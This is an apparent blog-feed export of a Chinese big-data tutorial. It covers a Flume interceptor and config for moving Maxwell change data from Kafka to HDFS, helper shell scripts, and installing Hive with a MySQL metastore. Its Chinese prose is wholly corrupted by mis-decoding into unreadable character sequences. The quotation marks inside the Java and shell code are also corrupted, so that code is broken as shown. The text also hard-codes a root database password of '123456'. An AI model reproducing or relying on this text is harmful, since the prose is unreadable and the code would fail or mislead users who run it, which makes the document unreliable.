true</p><p>a1.sources.r1.topicHeader = topic</p><p>a1.sources.r1.interceptors = i1</p><p>a1.sources.r1.interceptors.i1.type =<br>com.atguigu.flume.interceptor.db.TimestampInterceptor$Builder</p><p>a1.channels.c1.type = file</p><p>a1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior2</p><p>a1.channels.c1.dataDirs = /opt/module/flume/data/behavior2/</p><p>a1.channels.c1.maxFileSize = 2146435071</p><p>a1.channels.c1.capacity = 1123456</p><p>a1.channels.c1.keep-alive = 6</p><p>#### sink1</p><p>a1.sinks.k1.type = hdfs</p><p>a1.sinks.k1.hdfs.path = /origin_data/gmall/db/%{topic}_inc/%Y-%m-%d</p><p>a1.sinks.k1.hdfs.filePrefix = db</p><p>a1.sinks.k1.hdfs.round = false</p><p>a1.sinks.k1.hdfs.rollInterval = 10</p><p>a1.sinks.k1.hdfs.rollSize = 134217728</p><p>a1.sinks.k1.hdfs.rollCount = 0</p><p>a1.sinks.k1.hdfs.fileType = CompressedStream</p><p>a1.sinks.k1.hdfs.codeC = gzip</p><p>#### æ‹¼è£…</p><p>a1.sources.r1.channels = c1</p><p>a1.sinks.k1.channel= c1</p><p><strong>ï¼ˆ3ï¼‰ç¼–å†™Flumeæ‹¦æˆªå™¨</strong></p><p>æ–°å»ºä¸€ä¸ªMavené¡¹ç›®ï¼Œå¹¶åœ¨pom.xmlæ–‡ä»¶ä¸­åŠ å…¥å¦‚ä¸‹é…ç½®</p><p>&lt;dependencies&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.apache.flume&lt;/groupId&gt;<br>&lt;artifactId&gt;flume-ng-core&lt;/artifactId&gt;<br>&lt;version&gt;1.9.0&lt;/version&gt;<br>&lt;scope&gt;provided&lt;/scope&gt;<br>&lt;/dependency&gt;  </p><p>&lt;dependency&gt;<br>&lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>&lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>&lt;version&gt;1.2.62&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;/dependencies&gt;  </p><p>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>&lt;version&gt;2.3.2&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;source&gt;1.8&lt;/source&gt;<br>&lt;target&gt;1.8&lt;/target&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;<br>&lt;configuration&gt;<br>&lt;descriptorRefs&gt;<br>&lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;<br>&lt;/descriptorRefs&gt;<br>&lt;/configuration&gt;<br>&lt;executions&gt;<br>&lt;execution&gt;<br>&lt;id&gt;make-assembly&lt;/id&gt;<br>&lt;phase&gt;package&lt;/phase&gt;<br>&lt;goals&gt;<br>&lt;goal&gt;single&lt;/goal&gt;<br>&lt;/goals&gt;<br>&lt;/execution&gt;<br>&lt;/executions&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;</p><p>åœ¨com.atguigu.flume.interceptor.dbåŒ…ä¸‹åˆ›å»ºTimestampInterceptorç±»</p><p>package com.atguigu.flume.interceptor.db;</p><p>import com.alibaba.fastjson.JSONObject;</p><p>import org.apache.flume.Context;</p><p>import org.apache.flume.Event;</p><p>import org.apache.flume.interceptor.Interceptor;</p><p>import java.nio.charset.StandardCharsets;</p><p>import java.util.List;</p><p>import java.util.Map;</p><p>public class TimestampInterceptor implements Interceptor {</p><p>@Override</p><p>public void initialize() {</p><p>}</p><p>@Override</p><p>public Event intercept(Event event) {</p><p>Map&lt;String, String&gt; headers = event.getHeaders();</p><p>String log = new String(event.getBody(), StandardCharsets.UTF_8);</p><p>JSONObject jsonObject = JSONObject.parseObject(log);</p><p>Long ts = jsonObject.getLong(â€œtsâ€);</p><p>//Maxwellè¾“å‡ºçš„æ•°æ®ä¸­çš„tså­—æ®µæ—¶é—´æˆ³å•ä½ä¸ºç§’ï¼ŒFlume HDFSSinkè¦æ±‚å•ä½ä¸ºæ¯«ç§’</p><p>String timeMills = String.valueOf(ts * 1000);</p><p>headers.put(â€œtimestampâ€, timeMills);</p><p>return event;</p><p>}</p><p>@Override</p><p>public List&lt;Event&gt; intercept(List&lt;Event&gt; events) {</p><p>for (Event event : events) {</p><p>intercept(event);</p><p>}</p><p>return events;</p><p>}</p><p>@Override</p><p>public void close() {</p><p>}</p><p>public static class Builder implements Interceptor.Builder {</p><p>@Override</p><p>public Interceptor build() {</p><p>return new TimestampInterceptor();</p><p>}</p><p>@Override</p><p>public void configure(Context context) {</p><p>}</p><p>}</p><p>}</p><p>é‡æ–°æ‰“åŒ…</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/361c38002f9891ce01e4771948d70b01.png"></p><p>å°†æ‰“å¥½çš„åŒ…æ”¾å…¥åˆ°hadoop104çš„/opt/module/flume/libæ–‡ä»¶å¤¹ä¸‹</p><p>[atguigu@hadoop102 lib]$ ls | grep interceptor</p><p>flume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar</p><p><strong>3ï¼‰é€šé“æµ‹è¯•</strong></p><p><strong>ï¼ˆ1ï¼‰å¯åŠ¨Zookeeperã€Kafkaé›†ç¾¤</strong></p><p><strong>ï¼ˆ2ï¼‰å¯åŠ¨hadoop104çš„Flume</strong></p><p>[atguigu@hadoop104 flume]$ bin/flume-ng agent -n a1 -c conf/ -f<br>job/kafka_to_hdfs_db.conf -Dflume.root.logger=info,console</p><p><strong>ï¼ˆ3ï¼‰ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®</strong></p><p>[atguigu@hadoop102 bin]$ cd /opt/module/db_log/</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p><strong>ï¼ˆ4ï¼‰è§‚å¯ŸHDFSä¸Šçš„ç›®æ ‡è·¯å¾„æ˜¯å¦æœ‰æ•°æ®å‡ºç°</strong></p><p>è‹¥HDFSä¸Šçš„ç›®æ ‡è·¯å¾„å·²æœ‰å¢é‡è¡¨çš„æ•°æ®å‡ºç°äº†ï¼Œå°±è¯æ˜æ•°æ®é€šé“å·²ç»æ‰“é€šã€‚</p><p><strong>ï¼ˆ5ï¼‰æ•°æ®ç›®æ ‡è·¯å¾„çš„æ—¥æœŸè¯´æ˜</strong></p><p>ä»”ç»†è§‚å¯Ÿï¼Œä¼šå‘ç°ç›®æ ‡è·¯å¾„ä¸­çš„æ—¥æœŸï¼Œå¹¶éæ¨¡æ‹Ÿæ•°æ®çš„ä¸šåŠ¡æ—¥æœŸï¼Œè€Œæ˜¯å½“å‰æ—¥æœŸã€‚è¿™æ˜¯ç”±äºMaxwellè¾“å‡ºçš„JSONå­—ç¬¦ä¸²ä¸­çš„tså­—æ®µçš„å€¼ï¼Œæ˜¯æ•°æ®çš„å˜åŠ¨æ—¥æœŸã€‚è€ŒçœŸå®åœºæ™¯ä¸‹ï¼Œæ•°æ®çš„ä¸šåŠ¡æ—¥æœŸä¸å˜åŠ¨æ—¥æœŸåº”å½“æ˜¯ä¸€è‡´çš„ã€‚</p><p>æ­¤å¤„ä¸ºäº†æ¨¡æ‹ŸçœŸå®ç¯å¢ƒï¼Œå¯¹Maxwellæºç è¿›è¡Œäº†æ”¹åŠ¨ï¼Œå¢åŠ äº†ä¸€ä¸ªå‚æ•°mock_dateï¼Œè¯¥å‚æ•°çš„ä½œç”¨å°±æ˜¯æŒ‡å®šMaxwellè¾“å‡ºJSONå­—ç¬¦ä¸²çš„tsæ—¶é—´æˆ³çš„æ—¥æœŸï¼Œæ¥ä¸‹æ¥è¿›è¡Œæµ‹è¯•ã€‚</p><p>ä¿®æ”¹Maxwellé…ç½®æ–‡ä»¶config.propertiesï¼Œå¢åŠ mock_dateå‚æ•°ï¼Œå¦‚ä¸‹</p><p>##è¯¥æ—¥æœŸé¡»å’Œ/opt/module/db_log/application.propertiesä¸­çš„mock.dateå‚æ•°ä¿æŒä¸€è‡´</p><p><strong>mock_date=2020-06-14</strong></p><p>æ³¨ï¼šè¯¥å‚æ•°ä»…ä¾›å­¦ä¹ ä½¿ç”¨<strong>ï¼Œä¿®æ”¹è¯¥å‚æ•°åé‡å¯Maxwellæ‰å¯ç”Ÿæ•ˆ</strong>ã€‚</p><p>é‡å¯Maxwell</p><p>[atguigu@hadoop102 bin]$ mxw.sh restart</p><p>é‡æ–°ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®</p><p>[atguigu@hadoop102 bin]$ cd /opt/module/db_log/</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p>è§‚å¯ŸHDFSç›®æ ‡è·¯å¾„æ—¥æœŸæ˜¯å¦æ­£å¸¸</p><p><strong>4ï¼‰ç¼–å†™Flumeå¯åœè„šæœ¬</strong></p><p>ä¸ºæ–¹ä¾¿ä½¿ç”¨ï¼Œæ­¤å¤„ç¼–å†™ä¸€ä¸ªFlumeçš„å¯åœè„šæœ¬</p><p><strong>1ï¼‰åœ¨hadoop102èŠ‚ç‚¹çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬f3.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim f3.sh</p><p>åœ¨è„šæœ¬ä¸­å¡«å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>case $1 in</p><p>â€œstartâ€)</p><p>echo â€œ â€”â€”â€“å¯åŠ¨ hadoop104 ä¸šåŠ¡æ•°æ®flumeâ€”â€”-â€œ</p><p>ssh hadoop104 â€œnohup /opt/module/flume/bin/flume-ng agent -n a1 -c<br>/opt/module/flume/conf -f /opt/module/flume/job/kafka_to_hdfs_db.conf<br>&gt;/dev/null 2&gt;&amp;1 &amp;â€</p><p>;;</p><p>â€œstopâ€)</p><p>echo â€œ â€”â€”â€“åœæ­¢ hadoop104 ä¸šåŠ¡æ•°æ®flumeâ€”â€”-â€œ</p><p>ssh hadoop104 â€œps -ef | grep kafka_to_hdfs_db.conf | grep -v grep |awk<br>â€˜{print \$2}â€™ | xargs -n1 killâ€</p><p>;;</p><p>esac</p><p><strong>2ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x f3.sh</p><p><strong>3ï¼‰f3å¯åŠ¨</strong></p><p>[atguigu@hadoop102 module]$ f3.sh start</p><p><strong>4ï¼‰f3åœæ­¢</strong></p><p>[atguigu@hadoop102 module]$ f3.sh stop</p><h4 id="å¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥"><a href="#å¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥" class="headerlink" title="å¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥"></a>å¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥</h4><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¢é‡è¡¨éœ€è¦åœ¨é¦–æ—¥è¿›è¡Œä¸€æ¬¡å…¨é‡åŒæ­¥ï¼Œåç»­æ¯æ—¥å†è¿›è¡Œå¢é‡åŒæ­¥ï¼Œé¦–æ—¥å…¨é‡åŒæ­¥å¯ä»¥ä½¿ç”¨Maxwellçš„bootstrapåŠŸèƒ½ï¼Œæ–¹ä¾¿èµ·è§ï¼Œä¸‹é¢ç¼–å†™ä¸€ä¸ªå¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥è„šæœ¬ã€‚</p><p><strong>1ï¼‰åœ¨~/binç›®å½•åˆ›å»ºmysql_to_kafka_inc_init.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim mysql_to_kafka_inc_init.sh</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p><p>##!/bin/bash</p><p>## è¯¥è„šæœ¬çš„ä½œç”¨æ˜¯åˆå§‹åŒ–æ‰€æœ‰çš„å¢é‡è¡¨ï¼Œåªéœ€æ‰§è¡Œä¸€æ¬¡</p><p>MAXWELL_HOME=/opt/module/maxwell</p><p>import_data() {</p><p>$MAXWELL_HOME/bin/maxwell-bootstrap â€“database gmall â€“table $1 â€“config<br>$MAXWELL_HOME/config.properties</p><p>}</p><p>case $1 in</p><p>â€œcart_infoâ€)</p><p>import_data cart_info</p><p>;;</p><p>â€œcomment_infoâ€)</p><p>import_data comment_info</p><p>;;</p><p>â€œcoupon_useâ€)</p><p>import_data coupon_use</p><p>;;</p><p>â€œfavor_infoâ€)</p><p>import_data favor_info</p><p>;;</p><p>â€œorder_detailâ€)</p><p>import_data order_detail</p><p>;;</p><p>â€œorder_detail_activityâ€)</p><p>import_data order_detail_activity</p><p>;;</p><p>â€œorder_detail_couponâ€)</p><p>import_data order_detail_coupon</p><p>;;</p><p>â€œorder_infoâ€)</p><p>import_data order_info</p><p>;;</p><p>â€œorder_refund_infoâ€)</p><p>import_data order_refund_info</p><p>;;</p><p>â€œorder_status_logâ€)</p><p>import_data order_status_log</p><p>;;</p><p>â€œpayment_infoâ€)</p><p>import_data payment_info</p><p>;;</p><p>â€œrefund_paymentâ€)</p><p>import_data refund_payment</p><p>;;</p><p>â€œuser_infoâ€)</p><p>import_data user_info</p><p>;;</p><p>â€œallâ€)</p><p>import_data cart_info</p><p>import_data comment_info</p><p>import_data coupon_use</p><p>import_data favor_info</p><p>import_data order_detail</p><p>import_data order_detail_activity</p><p>import_data order_detail_coupon</p><p>import_data order_info</p><p>import_data order_refund_info</p><p>import_data order_status_log</p><p>import_data payment_info</p><p>import_data refund_payment</p><p>import_data user_info</p><p>;;</p><p>esac</p><p><strong>2ï¼‰ä¸ºmysql_to_kafka_inc_init.shå¢åŠ æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/mysql_to_kafka_inc_init.sh</p><p><strong>3ï¼‰æµ‹è¯•åŒæ­¥è„šæœ¬</strong></p><p><strong>ï¼ˆ1ï¼‰æ¸…ç†å†å²æ•°æ®</strong></p><p>ä¸ºæ–¹ä¾¿æŸ¥çœ‹ç»“æœï¼Œç°å°†HDFSä¸Šä¹‹å‰åŒæ­¥çš„å¢é‡è¡¨æ•°æ®åˆ é™¤</p><p>[atguigu@hadoop102 ~]$ hadoop fs -ls /origin_data/gmall/db | grep _inc |<br>awk â€˜{print $8}â€™ | xargs hadoop fs -rm -r -f</p><p><strong>ï¼ˆ2ï¼‰æ‰§è¡ŒåŒæ­¥è„šæœ¬</strong></p><p>[atguigu@hadoop102 bin]$ mysql_to_kafka_inc_init.sh all</p><p><strong>4ï¼‰æ£€æŸ¥åŒæ­¥ç»“æœ</strong></p><p>è§‚å¯ŸHDFSä¸Šæ˜¯å¦é‡æ–°å‡ºç°å¢é‡è¡¨æ•°æ®ã€‚</p><h4 id="å¢é‡è¡¨åŒæ­¥æ€»ç»“"><a href="#å¢é‡è¡¨åŒæ­¥æ€»ç»“" class="headerlink" title="å¢é‡è¡¨åŒæ­¥æ€»ç»“"></a>å¢é‡è¡¨åŒæ­¥æ€»ç»“</h4><p>å¢é‡è¡¨åŒæ­¥ï¼Œéœ€è¦åœ¨é¦–æ—¥è¿›è¡Œä¸€æ¬¡å…¨é‡åŒæ­¥ï¼Œåç»­æ¯æ—¥æ‰æ˜¯å¢é‡åŒæ­¥ã€‚é¦–æ—¥è¿›è¡Œå…¨é‡åŒæ­¥æ—¶ï¼Œéœ€å…ˆå¯åŠ¨æ•°æ®é€šé“ï¼ŒåŒ…æ‹¬Maxwellã€Kafkaã€Flumeï¼Œç„¶åæ‰§è¡Œå¢é‡è¡¨é¦–æ—¥åŒæ­¥è„šæœ¬mysql_to_kafka_inc_init.shè¿›è¡ŒåŒæ­¥ã€‚åç»­æ¯æ—¥åªéœ€ä¿è¯é‡‡é›†é€šé“æ­£å¸¸è¿è¡Œå³å¯ï¼ŒMaxwellä¾¿ä¼šå®æ—¶å°†å˜åŠ¨æ•°æ®å‘å¾€Kafkaã€‚</p><h2 id="ç¬¬4ç« -æ•°ä»“ç¯å¢ƒå‡†å¤‡"><a href="#ç¬¬4ç« -æ•°ä»“ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¬¬4ç«  æ•°ä»“ç¯å¢ƒå‡†å¤‡"></a>ç¬¬4ç«  æ•°ä»“ç¯å¢ƒå‡†å¤‡</h2><h3 id="Hiveå®‰è£…éƒ¨ç½²"><a href="#Hiveå®‰è£…éƒ¨ç½²" class="headerlink" title="Hiveå®‰è£…éƒ¨ç½²"></a>Hiveå®‰è£…éƒ¨ç½²</h3><p><strong>1ï¼‰æŠŠapache-hive-3.1.2-bin.tar.gzä¸Šä¼ åˆ°linuxçš„/opt/softwareç›®å½•ä¸‹</strong></p><p><strong>2ï¼‰è§£å‹apache-hive-3.1.2-bin.tar.gzåˆ°/opt/module/ç›®å½•ä¸‹é¢</strong></p><p>[atguigu@hadoop102 software]$ tar -zxvf<br>/opt/software/apache-hive-3.1.2-bin.tar.gz -C /opt/module/</p><p><strong>3ï¼‰ä¿®æ”¹apache-hive-3.1.2-bin.tar.gzçš„åç§°ä¸ºhive</strong></p><p>[atguigu@hadoop102 software]$ mv /opt/module/apache-hive-3.1.2-bin/<br>/opt/module/hive</p><p><strong>4ï¼‰ä¿®æ”¹/etc/profile.d/my_env.shï¼Œæ·»åŠ ç¯å¢ƒå˜é‡</strong></p><p>[atguigu@hadoop102 software]$ sudo vim /etc/profile.d/my_env.sh</p><p>æ·»åŠ å†…å®¹</p><p>##HIVE_HOME</p><p>export HIVE_HOME=/opt/module/hive</p><p>export PATH=$PATH:$HIVE_HOME/bin</p><p>é‡å¯Xshellå¯¹è¯æ¡†æˆ–è€…sourceä¸€ä¸‹ /etc/profile.d/my_env.shæ–‡ä»¶ï¼Œä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</p><p>[atguigu@hadoop102 software]$ source /etc/profile.d/my_env.sh</p><p><strong>5ï¼‰è§£å†³æ—¥å¿—JaråŒ…å†²çªï¼Œè¿›å…¥/opt/module/hive/libç›®å½•</strong></p><p>[atguigu@hadoop102 lib]$ mv log4j-slf4j-impl-2.10.0.jar<br>log4j-slf4j-impl-2.10.0.jar.bak</p><h3 id="Hiveå…ƒæ•°æ®é…ç½®åˆ°MySQL"><a href="#Hiveå…ƒæ•°æ®é…ç½®åˆ°MySQL" class="headerlink" title="Hiveå…ƒæ•°æ®é…ç½®åˆ°MySQL"></a>Hiveå…ƒæ•°æ®é…ç½®åˆ°MySQL</h3><h4 id="æ‹·è´é©±åŠ¨"><a href="#æ‹·è´é©±åŠ¨" class="headerlink" title="æ‹·è´é©±åŠ¨"></a>æ‹·è´é©±åŠ¨</h4><p>å°†MySQLçš„JDBCé©±åŠ¨æ‹·è´åˆ°Hiveçš„libç›®å½•ä¸‹</p><p>[atguigu@hadoop102 lib]$ cp /opt/software/mysql-connector-java-5.1.27.jar<br>/opt/module/hive/lib/</p><h4 id="é…ç½®MySQLä½œä¸ºå…ƒæ•°æ®å­˜å‚¨"><a href="#é…ç½®MySQLä½œä¸ºå…ƒæ•°æ®å­˜å‚¨" class="headerlink" title="é…ç½®MySQLä½œä¸ºå…ƒæ•°æ®å­˜å‚¨"></a>é…ç½®MySQLä½œä¸ºå…ƒæ•°æ®å­˜å‚¨</h4><p>åœ¨$HIVE_HOME/confç›®å½•ä¸‹æ–°å»ºhive-site.xmlæ–‡ä»¶</p><p>[atguigu@hadoop102 conf]$ vim hive-site.xml</p><p>æ·»åŠ å¦‚ä¸‹å†…å®¹</p><p>&lt;?xml version=â€1.0â€?&gt;</p><p>&lt;?xml-stylesheet type=â€text/xslâ€ href=â€configuration.xslâ€?&gt;</p><p>&lt;configuration&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</p><p>&lt;value&gt;jdbc:mysql://hadoop102:3306/metastore?useSSL=false&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</p><p>&lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</p><p>&lt;value&gt;root&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</p><p>&lt;value&gt;123456&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt;</p><p>&lt;value&gt;/user/hive/warehouse&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.metastore.schema.verification&lt;/name&gt;</p><p>&lt;value&gt;false&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.server2.thrift.port&lt;/name&gt;</p><p>&lt;value&gt;10000&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.server2.thrift.bind.host&lt;/name&gt;</p><p>&lt;value&gt;hadoop102&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.metastore.event.db.notification.api.auth&lt;/name&gt;</p><p>&lt;value&gt;false&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.cli.print.header&lt;/name&gt;</p><p>&lt;value&gt;true&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.cli.print.current.db&lt;/name&gt;</p><p>&lt;value&gt;true&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;/configuration&gt;</p><h3 id="å¯åŠ¨Hive"><a href="#å¯åŠ¨Hive" class="headerlink" title="å¯åŠ¨Hive"></a>å¯åŠ¨Hive</h3><h4 id="åˆå§‹åŒ–å…ƒæ•°æ®åº“"><a href="#åˆå§‹åŒ–å…ƒæ•°æ®åº“" class="headerlink" title="åˆå§‹åŒ–å…ƒæ•°æ®åº“"></a>åˆå§‹åŒ–å…ƒæ•°æ®åº“</h4><p><strong>1ï¼‰ç™»é™†MySQL</strong></p><p>[atguigu@hadoop102 conf]$ mysql -uroot -p123456</p><p><strong>2ï¼‰æ–°å»ºHiveå…ƒæ•°æ®åº“</strong></p><p>mysql&gt; create database metastore;</p><p>mysql&gt; quit;</p><p><strong>3ï¼‰åˆå§‹åŒ–Hiveå…ƒæ•°æ®åº“</strong></p><p>[atguigu@hadoop102 conf]$ schematool -initSchema -dbType mysql -verbose</p><h4 id="å¯åŠ¨hiveå®¢æˆ·ç«¯"><a href="#å¯åŠ¨hiveå®¢æˆ·ç«¯" class="headerlink" title="å¯åŠ¨hiveå®¢æˆ·ç«¯"></a>å¯åŠ¨hiveå®¢æˆ·ç«¯</h4><p><strong>1ï¼‰å¯åŠ¨Hiveå®¢æˆ·ç«¯</strong></p><p>[atguigu@hadoop102 hive]$ bin/hive</p><p><strong>2ï¼‰æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“</strong></p><p>hive (default)&gt; show databases;</p><p>OK</p><p>database_name</p><p>default</p><h3 id="ä¿®æ”¹å…ƒæ•°æ®åº“å­—ç¬¦é›†"><a href="#ä¿®æ”¹å…ƒæ•°æ®åº“å­—ç¬¦é›†" class="headerlink" title="ä¿®æ”¹å…ƒæ•°æ®åº“å­—ç¬¦é›†"></a>ä¿®æ”¹å…ƒæ•°æ®åº“å­—ç¬¦é›†</h3><p>Hiveå…ƒæ•°æ®åº“çš„å­—ç¬¦é›†é»˜è®¤ä¸ºLatin1ï¼Œç”±äºå…¶ä¸æ”¯æŒä¸­æ–‡å­—ç¬¦ï¼Œæ•…è‹¥å»ºè¡¨è¯­å¥ä¸­åŒ…å«ä¸­æ–‡æ³¨é‡Šï¼Œä¼šå‡ºç°ä¹±ç ç°è±¡ã€‚å¦‚éœ€è§£å†³ä¹±ç é—®é¢˜ï¼Œé¡»åšä»¥ä¸‹ä¿®æ”¹ã€‚</p><p><strong>1ï¼‰ä¿®æ”¹Hiveå…ƒæ•°æ®åº“ä¸­å­˜å‚¨æ³¨é‡Šçš„å­—æ®µçš„å­—ç¬¦é›†ä¸ºutf-8</strong></p><p><strong>ï¼ˆ1ï¼‰å­—æ®µæ³¨é‡Š</strong></p><p>mysql&gt; alter table COLUMNS_V2 modify column COMMENT varchar(256) character set<br>utf8;</p><p><strong>ï¼ˆ2ï¼‰è¡¨æ³¨é‡Š</strong></p><p>mysql&gt; alter table TABLE_PARAMS modify column PARAM_VALUE mediumtext character<br>set utf8;</p><p><strong>2ï¼‰ä¿®æ”¹hive-site.xmlä¸­JDBC URLï¼Œå¦‚ä¸‹</strong></p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</p><p>&lt;value&gt;jdbc:mysql://hadoop102:3306/metastore?useSSL=false<strong>&amp;amp;useUnicode=true&amp;characterEncoding=UTF-8</strong>&lt;/value&gt;</p><p>&lt;/property&gt;</p>]]></content>
      
      
      <categories>
          
          <category> é¡¹ç›® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ä»“åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”µå•†æ•°ä»“V5.0</title>
      <link href="/2022/01/22/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93V5.0/"/>
      <url>/2022/01/22/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93V5.0/</url>
      
        <content type="html"><![CDATA[<p>å°šç¡…è°·å¤§æ•°æ®é¡¹ç›®ä¹‹ç”µå•†æ•°ä»“ï¼ˆç”µå•†æ•°æ®ä»“åº“ç³»ç»Ÿï¼‰</p><p>(ä½œè€…ï¼šå°šç¡…è°·å¤§æ•°æ®ç ”å‘éƒ¨)</p><p>ç‰ˆæœ¬ï¼šV5.0</p><h2 id="ç¬¬1ç« -æ•°æ®ä»“åº“æ¦‚è¿°"><a href="#ç¬¬1ç« -æ•°æ®ä»“åº“æ¦‚è¿°" class="headerlink" title="ç¬¬1ç«  æ•°æ®ä»“åº“æ¦‚è¿°"></a>ç¬¬1ç«  æ•°æ®ä»“åº“æ¦‚è¿°</h2><h3 id="æ•°æ®ä»“åº“æ¦‚å¿µ"><a href="#æ•°æ®ä»“åº“æ¦‚å¿µ" class="headerlink" title="æ•°æ®ä»“åº“æ¦‚å¿µ"></a>æ•°æ®ä»“åº“æ¦‚å¿µ</h3><p>æ•°æ®ä»“åº“æ˜¯ä¸€ä¸ªä¸ºæ•°æ®åˆ†æè€Œè®¾è®¡çš„ä¼ä¸šçº§æ•°æ®ç®¡ç†ç³»ç»Ÿã€‚æ•°æ®ä»“åº“å¯é›†ä¸­ã€æ•´åˆå¤šä¸ªä¿¡æ¯æºçš„å¤§é‡æ•°æ®ï¼Œå€ŸåŠ©æ•°æ®ä»“åº“çš„åˆ†æèƒ½åŠ›ï¼Œä¼ä¸šå¯ä»æ•°æ®ä¸­è·å¾—å®è´µçš„ä¿¡æ¯è¿›è€Œæ”¹è¿›å†³ç­–ã€‚åŒæ—¶ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œæ•°æ®ä»“åº“ä¸­ç§¯ç´¯çš„å¤§é‡å†å²æ•°æ®å¯¹äºæ•°æ®ç§‘å­¦å®¶å’Œä¸šåŠ¡åˆ†æå¸ˆä¹Ÿæ˜¯ååˆ†å®è´µçš„ã€‚</p><h3 id="æ•°æ®ä»“åº“æ ¸å¿ƒæ¶æ„"><a href="#æ•°æ®ä»“åº“æ ¸å¿ƒæ¶æ„" class="headerlink" title="æ•°æ®ä»“åº“æ ¸å¿ƒæ¶æ„"></a>æ•°æ®ä»“åº“æ ¸å¿ƒæ¶æ„</h3><h2 id="ç¬¬2ç« -æ•°æ®ä»“åº“å»ºæ¨¡æ¦‚è¿°"><a href="#ç¬¬2ç« -æ•°æ®ä»“åº“å»ºæ¨¡æ¦‚è¿°" class="headerlink" title="ç¬¬2ç«  æ•°æ®ä»“åº“å»ºæ¨¡æ¦‚è¿°"></a>ç¬¬2ç«  æ•°æ®ä»“åº“å»ºæ¨¡æ¦‚è¿°</h2><h3 id="æ•°æ®ä»“åº“å»ºæ¨¡çš„æ„ä¹‰"><a href="#æ•°æ®ä»“åº“å»ºæ¨¡çš„æ„ä¹‰" class="headerlink" title="æ•°æ®ä»“åº“å»ºæ¨¡çš„æ„ä¹‰"></a>æ•°æ®ä»“åº“å»ºæ¨¡çš„æ„ä¹‰</h3><p>å¦‚æœæŠŠæ•°æ®çœ‹ä½œå›¾ä¹¦é¦†é‡Œçš„ä¹¦ï¼Œæˆ‘ä»¬å¸Œæœ›çœ‹åˆ°å®ƒä»¬åœ¨ä¹¦æ¶ä¸Šåˆ†é—¨åˆ«ç±»åœ°æ”¾ç½®ï¼›å¦‚æœæŠŠæ•°æ®çœ‹ä½œåŸå¸‚çš„å»ºç­‘ï¼Œæˆ‘ä»¬å¸Œæœ›åŸå¸‚è§„åˆ’å¸ƒå±€åˆç†ï¼›å¦‚æœæŠŠæ•°æ®çœ‹ä½œç”µè„‘æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¸Œæœ›æŒ‰ç…§è‡ªå·±çš„ä¹ 